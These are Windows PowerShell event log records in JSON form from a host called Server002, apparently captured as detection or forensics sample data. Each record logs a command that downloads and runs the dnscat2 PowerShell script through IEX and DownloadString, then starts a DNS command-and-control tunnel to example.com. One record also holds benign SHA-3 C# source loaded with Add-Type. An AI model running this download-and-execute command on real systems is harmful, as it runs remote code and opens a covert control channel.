{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:11.9023626"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:11.9023626"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:11.9023626"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:11.9127371"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:11.9640009"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:11.9640009"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:12.0789082"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=b62b237c-1b8d-47cb-b63e-4ee09afb470d\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"800"},"Version":"0","Level":"4","Task":"8","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:14.6219146"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Add-type -TypeDefinition $source -Language CSharp\r\n, \tDetailSequence=1\r\n\tDetailTotal=3\r\n\r\n\tSequenceNumber=15\r\n\r\n\tUserId=SERVER002\\admin_test\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=b62b237c-1b8d-47cb-b63e-4ee09afb470d\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=Add-type -TypeDefinition $source -Language CSharp\r\n, CommandInvocation(Add-Type): \"Add-Type\"\r\n","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"800"},"Version":"0","Level":"4","Task":"8","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 10:41:14.6219146"},"EventRecordID":"1051","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Add-type -TypeDefinition $source -Language CSharp\r\n, \tDetailSequence=2\r\n\tDetailTotal=3\r\n\r\n\tSequenceNumber=15\r\n\r\n\tUserId=SERVER002\\admin_test\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92531f1b-8535-4ed6-b9fc-93ab5d11ae2c\r\n\tHostApplication=powershell.exe &amp; {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\r\nStart-Dnscat2 -Domain example.com -DNSServer 127.0.0.1}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=b62b237c-1b8d-47cb-b63e-4ee09afb470d\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=Add-type -TypeDefinition $source -Language CSharp\r\n, ParameterBinding(Add-Type): name=\"TypeDefinition\"; value=\"using System;\r\nusing System.Diagnostics;\r\nusing Org.BouncyCastle.Utilities;\r\n\r\nnamespace Org.BouncyCastle.Crypto.Digests\r\n{\r\n    /// &lt;summary&gt;\r\n    /// Implementation of Keccak based on following KeccakNISTInterface.c from http://keccak.noekeon.org/\r\n    /// &lt;/summary&gt;\r\n    /// &lt;remarks&gt;\r\n    /// Following the naming conventions used in the C source code to enable easy review of the implementation.\r\n    /// &lt;/remarks&gt;\r\n    public class KeccakDigest\r\n    {\r\n        private static readonly ulong[] KeccakRoundConstants = KeccakInitializeRoundConstants();\r\n\r\n        private static readonly int[] KeccakRhoOffsets = KeccakInitializeRhoOffsets();\r\n\r\n        private static ulong[] KeccakInitializeRoundConstants()\r\n        {\r\n            ulong[] keccakRoundConstants = new ulong[24];\r\n            byte LFSRState = 0x01;\r\n\r\n            for (int i = 0; i &lt; 24; i++)\r\n            {\r\n                keccakRoundConstants[i] = 0;\r\n                for (int j = 0; j &lt; 7; j++)\r\n                {\r\n                    int bitPosition = (1 &lt;&lt; j) - 1;\r\n\r\n                    // LFSR86540\r\n\r\n                    bool loBit = (LFSRState &amp; 0x01) != 0;\r\n                    if (loBit)\r\n                    {\r\n                        keccakRoundConstants[i] ^= 1UL &lt;&lt; bitPosition;\r\n                    }\r\n\r\n                    bool hiBit = (LFSRState &amp; 0x80) != 0;\r\n                    LFSRState &lt;&lt;= 1;\r\n                    if (hiBit)\r\n                    {\r\n                        LFSRState ^= 0x71;\r\n                    }\r\n\r\n                }\r\n            }\r\n\r\n            return keccakRoundConstants;\r\n        }\r\n\r\n        private static int[] KeccakInitializeRhoOffsets()\r\n        {\r\n            int[] keccakRhoOffsets = new int[25];\r\n            int x, y, t, newX, newY;\r\n\r\n            int rhoOffset = 0;\r\n            keccakRhoOffsets[(((0) % 5) + 5 * ((0) % 5))] = rhoOffset;\r\n            x = 1;\r\n            y = 0;\r\n            for (t = 1; t &lt; 25; t++)\r\n            {\r\n                //rhoOffset = ((t + 1) * (t + 2) / 2) % 64;\r\n                rhoOffset = (rhoOffset + t) &amp; 63;\r\n                keccakRhoOffsets[(((x) % 5) + 5 * ((y) % 5))] = rhoOffset;\r\n                newX = (0 * x + 1 * y) % 5;\r\n                newY = (2 * x + 3 * y) % 5;\r\n                x = newX;\r\n                y = newY;\r\n            }\r\n\r\n            return keccakRhoOffsets;\r\n        }\r\n\r\n        protected byte[] state = new byte[(1600 / 8)];\r\n        protected byte[] dataQueue = new byte[(1536 / 8)];\r\n        protected int rate;\r\n        protected int bitsInQueue;\r\n        protected int fixedOutputLength;\r\n        protected bool squeezing;\r\n        protected int bitsAvailableForSqueezing;\r\n        protected byte[] chunk;\r\n        protected byte[] oneByte;\r\n\r\n        private void ClearDataQueueSection(int off, int len)\r\n        {\r\n            for (int i = off; i != off + len; i++)\r\n            {\r\n                dataQueue[i] = 0;\r\n            }\r\n        }\r\n\r\n        public KeccakDigest()\r\n            : this(288)\r\n        {\r\n        }\r\n\r\n        public KeccakDigest(int bitLength)\r\n        {\r\n            Init(bitLength);\r\n        }\r\n\r\n        public KeccakDigest(KeccakDigest source)\r\n        {\r\n            CopyIn(source);\r\n        }\r\n\r\n        private void CopyIn(KeccakDigest source)\r\n        {\r\n            Array.Copy(source.state, 0, this.state, 0, source.state.Length);\r\n            Array.Copy(source.dataQueue, 0, this.dataQueue, 0, source.dataQueue.Length);\r\n            this.rate = source.rate;\r\n            this.bitsInQueue = source.bitsInQueue;\r\n            this.fixedOutputLength = source.fixedOutputLength;\r\n            this.squeezing = source.squeezing;\r\n            this.bitsAvailableForSqueezing = source.bitsAvailableForSqueezing;\r\n            this.chunk = Arrays.Clone(source.chunk);\r\n            this.oneByte = Arrays.Clone(source.oneByte);\r\n        }\r\n\r\n        public virtual string AlgorithmName\r\n        {\r\n            get { return \"Keccak-\" + fixedOutputLength; }\r\n        }\r\n\r\n        public virtual int GetDigestSize()\r\n        {\r\n            return fixedOutputLength / 8;\r\n        }\r\n\r\n        public virtual void Update(byte input)\r\n        {\r\n            oneByte[0] = input;\r\n\r\n            Absorb(oneByte, 0, 8L);\r\n        }\r\n\r\n        public virtual void BlockUpdate(byte[] input, int inOff, int len)\r\n        {\r\n            Absorb(input, inOff, len * 8L);\r\n        }\r\n\r\n        public virtual int DoFinal(byte[] output, int outOff)\r\n        {\r\n            Squeeze(output, outOff, fixedOutputLength);\r\n\r\n            Reset();\r\n\r\n            return GetDigestSize();\r\n        }\r\n\r\n        /*\r\n         * TODO Possible API change to support partial-byte suffixes.\r\n         */\r\n        protected virtual int DoFinal(byte[] output, int outOff, byte partialByte, int partialBits)\r\n        {\r\n            if (partialBits &gt; 0)\r\n            {\r\n                oneByte[0] = partialByte;\r\n                Absorb(oneByte, 0, partialBits);\r\n            }\r\n\r\n            Squeeze(output, outOff, fixedOutputLength);\r\n\r\n            Reset();\r\n\r\n            return GetDigestSize();\r\n        }\r\n\r\n        public virtual void Reset()\r\n        {\r\n            Init(fixedOutputLength);\r\n        }\r\n\r\n        /**\r\n         * Return the size of block that the compression function is applied to in bytes.\r\n         *\r\n         * @return internal byte length of a block.\r\n         */\r\n        public virtual int GetByteLength()\r\n        {\r\n            return rate / 8;\r\n        }\r\n\r\n        private void Init(int bitLength)\r\n        {\r\n            switch (bitLength)\r\n            {\r\n                case 128:\r\n                    InitSponge(1344, 256);\r\n                    break;\r\n                case 224:\r\n                    InitSponge(1152, 448);\r\n                    break;\r\n                case 256:\r\n                    InitSponge(1088, 512);\r\n                    break;\r\n                case 288:\r\n                    InitSponge(1024, 576);\r\n                    break;\r\n                case 384:\r\n                    InitSponge(832, 768);\r\n                    break;\r\n                case 512:\r\n                    InitSponge(576, 1024);\r\n                    break;\r\n                default:\r\n                    throw new ArgumentException(\"must be one of 128, 224, 256, 288, 384, or 512.\", \"bitLength\");\r\n            }\r\n        }\r\n\r\n        private void InitSponge(int rate, int capacity)\r\n        {\r\n            if (rate + capacity != 1600)\r\n            {\r\n                throw new InvalidOperationException(\"rate + capacity != 1600\");\r\n            }\r\n            if ((rate &lt;= 0) || (rate &gt;= 1600) || ((rate % 64) != 0))\r\n            {\r\n                throw new InvalidOperationException(\"invalid rate value\");\r\n            }\r\n\r\n            this.rate = rate;\r\n            // this is never read, need to check to see why we want to save it\r\n            //  this.capacity = capacity;\r\n            this.fixedOutputLength = 0;\r\n            Arrays.Fill(this.state, (byte)0);\r\n            Arrays.Fill(this.dataQueue, (byte)0);\r\n            this.bitsInQueue = 0;\r\n            this.squeezing = false;\r\n            this.bitsAvailableForSqueezing = 0;\r\n            this.fixedOutputLength = capacity / 2;\r\n            this.chunk = new byte[rate / 8];\r\n            this.oneByte = new byte[1];\r\n        }\r\n\r\n        private void AbsorbQueue()\r\n        {\r\n            KeccakAbsorb(state, dataQueue, rate / 8);\r\n\r\n            bitsInQueue = 0;\r\n        }\r\n\r\n        protected virtual void Absorb(byte[] data, int off, long databitlen)\r\n        {\r\n            long i, j, wholeBlocks;\r\n\r\n            if ((bitsInQueue % 8) != 0)\r\n            {\r\n                throw new InvalidOperationException(\"attempt to absorb with odd length queue.\");\r\n            }\r\n            if (squeezing)\r\n            {\r\n                throw new InvalidOperationException(\"attempt to absorb while squeezing.\");\r\n            }\r\n\r\n            i = 0;\r\n            while (i &lt; databitlen)\r\n            {\r\n                if ((bitsInQueue == 0) &amp;&amp; (databitlen &gt;= rate) &amp;&amp; (i &lt;= (databitlen - rate)))\r\n                {\r\n                    wholeBlocks = (databitlen - i) / rate;\r\n\r\n                    for (j = 0; j &lt; wholeBlocks; j++)\r\n                    {\r\n                        Array.Copy(data, (int)(off + (i / 8) + (j * chunk.Length)), chunk, 0, chunk.Length);\r\n\r\n                        KeccakAbsorb(state, chunk, chunk.Length);\r\n                    }\r\n\r\n                    i += wholeBlocks * rate;\r\n                }\r\n                else\r\n                {\r\n                    int partialBlock = (int)(databitlen - i);\r\n                    if (partialBlock + bitsInQueue &gt; rate)\r\n                    {\r\n                        partialBlock = rate - bitsInQueue;\r\n                    }\r\n                    int partialByte = partialBlock % 8;\r\n                    partialBlock -= partialByte;\r\n                    Array.Copy(data, off + (int)(i / 8), dataQueue, bitsInQueue / 8, partialBlock / 8);\r\n\r\n                    bitsInQueue += partialBlock;\r\n                    i += partialBlock;\r\n                    if (bitsInQueue == rate)\r\n                    {\r\n                        AbsorbQueue();\r\n                    }\r\n                    if (partialByte &gt; 0)\r\n                    {\r\n                        int mask = (1 &lt;&lt; partialByte) - 1;\r\n                        dataQueue[bitsInQueue / 8] = (byte)(data[off + ((int)(i / 8))] &amp; mask);\r\n                        bitsInQueue += partialByte;\r\n                        i += partialByte;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        private void PadAndSwitchToSqueezingPhase()\r\n        {\r\n            if (bitsInQueue + 1 == rate)\r\n            {\r\n                dataQueue[bitsInQueue / 8] |= (byte)(1U &lt;&lt; (bitsInQueue % 8));\r\n                AbsorbQueue();\r\n                ClearDataQueueSection(0, rate / 8);\r\n            }\r\n            else\r\n            {\r\n                ClearDataQueueSection((bitsInQueue + 7) / 8, rate / 8 - (bitsInQueue + 7) / 8);\r\n                dataQueue[bitsInQueue / 8] |= (byte)(1U &lt;&lt; (bitsInQueue % 8));\r\n            }\r\n            dataQueue[(rate - 1) / 8] |= (byte)(1U &lt;&lt; ((rate - 1) % 8));\r\n            AbsorbQueue();\r\n\r\n            if (rate == 1024)\r\n            {\r\n                KeccakExtracdatabits(state, dataQueue);\r\n                bitsAvailableForSqueezing = 1024;\r\n            }\r\n            else\r\n            {\r\n                KeccakExtract(state, dataQueue, rate / 64);\r\n                bitsAvailableForSqueezing = rate;\r\n            }\r\n\r\n            squeezing = true;\r\n        }\r\n\r\n        protected virtual void Squeeze(byte[] output, int offset, long outputLength)\r\n        {\r\n            long i;\r\n            int partialBlock;\r\n\r\n            if (!squeezing)\r\n            {\r\n                PadAndSwitchToSqueezingPhase();\r\n            }\r\n            if ((outputLength % 8) != 0)\r\n            {\r\n                throw new InvalidOperationException(\"outputLength not a multiple of 8\");\r\n            }\r\n\r\n            i = 0;\r\n            while (i &lt; outputLength)\r\n            {\r\n                if (bitsAvailableForSqueezing == 0)\r\n                {\r\n                    KeccakPermutation(state);\r\n\r\n                    if (rate == 1024)\r\n                    {\r\n                        KeccakExtracdatabits(state, dataQueue);\r\n                        bitsAvailableForSqueezing = 1024;\r\n                    }\r\n                    else\r\n                    {\r\n                        KeccakExtract(state, dataQueue, rate / 64);\r\n                        bitsAvailableForSqueezing = rate;\r\n                    }\r\n                }\r\n                partialBlock = bitsAvailableForSqueezing;\r\n                if ((long)partialBlock &gt; outputLength - i)\r\n                {\r\n                    partialBlock = (int)(outputLength - i);\r\n                }\r\n\r\n                Array.Copy(dataQueue, (rate - bitsAvailableForSqueezing) / 8, output, offset + (int)(i / 8), partialBlock / 8);\r\n                bitsAvailableForSqueezing -= partialBlock;\r\n                i += partialBlock;\r\n            }\r\n        }\r\n\r\n        private static void FromBytesToWords(ulong[] stateAsWords, byte[] state)\r\n        {\r\n            for (int i = 0; i &lt; (1600 / 64); i++)\r\n            {\r\n                stateAsWords[i] = 0;\r\n                int index = i * (64 / 8);\r\n                for (int j = 0; j &lt; (64 / 8); j++)\r\n                {\r\n                    stateAsWords[i] |= ((ulong)state[index + j] &amp; 0xff) &lt;&lt; ((8 * j));\r\n                }\r\n            }\r\n        }\r\n\r\n        private static void FromWordsToBytes(byte[] state, ulong[] stateAsWords)\r\n        {\r\n            for (int i = 0; i &lt; (1600 / 64); i++)\r\n            {\r\n                int index = i * (64 / 8);\r\n                for (int j = 0; j &lt; (64 / 8); j++)\r\n                {\r\n                    state[index + j] = (byte)(stateAsWords[i] &gt;&gt; (8 * j));\r\n                }\r\n            }\r\n        }\r\n\r\n        private void KeccakPermutation(byte[] state)\r\n        {\r\n            ulong[] longState = new ulong[state.Length / 8];\r\n\r\n            FromBytesToWords(longState, state);\r\n\r\n            KeccakPermutationOnWords(longState);\r\n\r\n            FromWordsToBytes(state, longState);\r\n        }\r\n\r\n        private void KeccakPermutationAfterXor(byte[] state, byte[] data, int dataLengthInBytes)\r\n        {\r\n            for (int i = 0; i &lt; dataLengthInBytes; i++)\r\n            {\r\n                state[i] ^= data[i];\r\n            }\r\n\r\n            KeccakPermutation(state);\r\n        }\r\n\r\n        private void KeccakPermutationOnWords(ulong[] state)\r\n        {\r\n            int i;\r\n\r\n            for (i = 0; i &lt; 24; i++)\r\n            {\r\n                Theta(state);\r\n                Rho(state);\r\n                Pi(state);\r\n                Chi(state);\r\n                Iota(state, i);\r\n            }\r\n        }\r\n\r\n        ulong[] C = new ulong[5];\r\n\r\n        private void Theta(ulong[] A)\r\n        {\r\n            for (int x = 0; x &lt; 5; x++)\r\n            {\r\n                C[x] = 0;\r\n                for (int y = 0; y &lt; 5; y++)\r\n                {\r\n                    C[x] ^= A[x + 5 * y];\r\n                }\r\n            }\r\n            for (int x = 0; x &lt; 5; x++)\r\n            {\r\n                ulong dX = ((((C[(x + 1) % 5]) &lt;&lt; 1) ^ ((C[(x + 1) % 5]) &gt;&gt; (64 - 1)))) ^ C[(x + 4) % 5];\r\n                for (int y = 0; y &lt; 5; y++)\r\n                {\r\n                    A[x + 5 * y] ^= dX;\r\n                }\r\n            }\r\n        }\r\n\r\n        private void Rho(ulong[] A)\r\n        {\r\n            for (int x = 0; x &lt; 5; x++)\r\n            {\r\n                for (int y = 0; y &lt; 5; y++)\r\n                {\r\n                    int index = x + 5 * y;\r\n                    A[index] = ((KeccakRhoOffsets[index] != 0) ? (((A[index]) &lt;&lt; KeccakRhoOffsets[index]) ^ ((A[index]) &gt;&gt; (64 - KeccakRhoOffsets[index]))) : A[index]);\r\n                }\r\n            }\r\n        }\r\n\r\n        ulong[] tempA = new ulong[25];\r\n\r\n        private void Pi(ulong[] A)\r\n        {\r\n            Array.Copy(A, 0, tempA, 0, tempA.Length);\r\n\r\n            for (int x = 0; x &lt; 5; x++)\r\n            {\r\n                for (int y = 0; y &lt; 5; y++)\r\n                {\r\n                    A[y + 5 * ((2 * x + 3 * y) % 5)] = tempA[x + 5 * y];\r\n                }\r\n            }\r\n        }\r\n\r\n        ulong[] chiC = new ulong[5];\r\n\r\n        private void Chi(ulong[] A)\r\n        {\r\n            for (int y = 0; y &lt; 5; y++)\r\n            {\r\n                for (int x = 0; x &lt; 5; x++)\r\n                {\r\n                    chiC[x] = A[x + 5 * y] ^ ((~A[(((x + 1) % 5) + 5 * y)]) &amp; A[(((x + 2) % 5) + 5 * y)]);\r\n                }\r\n                for (int x = 0; x &lt; 5; x++)\r\n                {\r\n                    A[x + 5 * y] = chiC[x];\r\n                }\r\n            }\r\n        }\r\n\r\n        private static void Iota(ulong[] A, int indexRound)\r\n        {\r\n            A[(((0) % 5) + 5 * ((0) % 5))] ^= KeccakRoundConstants[indexRound];\r\n        }\r\n\r\n        private void KeccakAbsorb(byte[] byteState, byte[] data, int dataInBytes)\r\n        {\r\n            KeccakPermutationAfterXor(byteState, data, dataInBytes);\r\n        }\r\n\r\n        private void KeccakExtracdatabits(byte[] byteState, byte[] data)\r\n        {\r\n            Array.Copy(byteState, 0, data, 0, 128);\r\n        }\r\n\r\n        private void KeccakExtract(byte[] byteState, byte[] data, int laneCount)\r\n        {\r\n            Array.Copy(byteState, 0, data, 0, laneCount * 8);\r\n        }\r\n\r\n        // public virtual IMemoable Copy()\r\n        // {\r\n        //     return new KeccakDigest(this);\r\n        // }\r\n\r\n        // public virtual void Reset(IMemoable other)\r\n        // {\r\n        //     KeccakDigest d = (KeccakDigest)other;\r\n\r\n        //     CopyIn(d);\r\n        // }\r\n    }\r\n}\r\n\r\nnamespace Org.BouncyCastle.Crypto.Digests\r\n{\r\n    /// &lt;summary&gt;\r\n    /// Implementation of SHA-3 based on following KeccakNISTInterface.c from http://keccak.noekeon.org/\r\n    /// &lt;/summary&gt;\r\n    /// &lt;remarks&gt;\r\n    /// Following the naming conventions used in the C source code to enable easy review of the implementation.\r\n    /// &lt;/remarks&gt;\r\n    public class Sha3Digest\r\n        : KeccakDigest\r\n    {\r\n        private static int CheckBitLength(int bitLength)\r\n        {\r\n            switch (bitLength)\r\n            {\r\n            case 224:\r\n            case 256:\r\n            case 384:\r\n            case 512:\r\n                return bitLength;\r\n            default:\r\n                throw new ArgumentException(bitLength + \" not supported for SHA-3\", \"bitLength\");\r\n            }\r\n        }\r\n\r\n        public Sha3Digest()\r\n            : this(256)\r\n        {\r\n        }\r\n\r\n        public Sha3Digest(int bitLength)\r\n            : base(CheckBitLength(bitLength))\r\n        {\r\n        }\r\n\r\n        public Sha3Digest(Sha3Digest source)\r\n            : base(source)\r\n        {\r\n        }\r\n\r\n        public override string AlgorithmName\r\n        {\r\n            get { return \"SHA3-\" + fixedOutputLength; }\r\n        }\r\n\r\n        public override int DoFinal(byte[] output, int outOff)\r\n        {\r\n            Absorb(new byte[]{ 0x02 }, 0, 2);\r\n\r\n            return base.DoFinal(output,  outOff);\r\n        }\r\n\r\n        /*\r\n         * TODO Possible API change to support partial-byte suffixes.\r\n         */\r\n        protected override int DoFinal(byte[] output, int outOff, byte partialByte, int partialBits)\r\n        {\r\n            if (partialBits &lt; 0 || partialBits &gt; 7)\r\n                throw new ArgumentException(\"must be in the range [0,7]\", \"partialBits\");\r\n\r\n            int finalInput = (partialByte &amp; ((1 &lt;&lt; partialBits) - 1)) | (0x02 &lt;&lt; partialBits);\r\n            Debug.Assert(finalInput &gt;= 0);\r\n            int finalBits = partialBits + 2;\r\n\r\n            if (finalBits &gt;= 8)\r\n            {\r\n                oneByte[0] = (byte)finalInput;\r\n                Absorb(oneByte, 0, 8);\r\n                finalBits -= 8;\r\n                finalInput &gt;&gt;= 8;\r\n            }\r\n\r\n            return base.DoFinal(output, outOff, (byte)finalInput, finalBits);\r\n        }\r\n\r\n    }\r\n}\r\n\r\nnamespace Org.BouncyCastle.Utilities\r\n{\r\n    /// &lt;summary&gt; General array utilities.&lt;/summary&gt;\r\n    public abstract class Arrays\r\n    {\r\n        public static byte[] Clone(\r\n            byte[] data)\r\n        {\r\n            return data == null ? null : (byte[])data.Clone();\r\n        }\r\n\r\n        public static void Fill(\r\n            byte[]\tbuf,\r\n            byte\tb)\r\n        {\r\n            int i = buf.Length;\r\n            while (i &gt; 0)\r\n            {\r\n                buf[--i] = b;\r\n            }\r\n        }\r\n    }\r\n}\r\n\"\r\n","Binary":""}}}
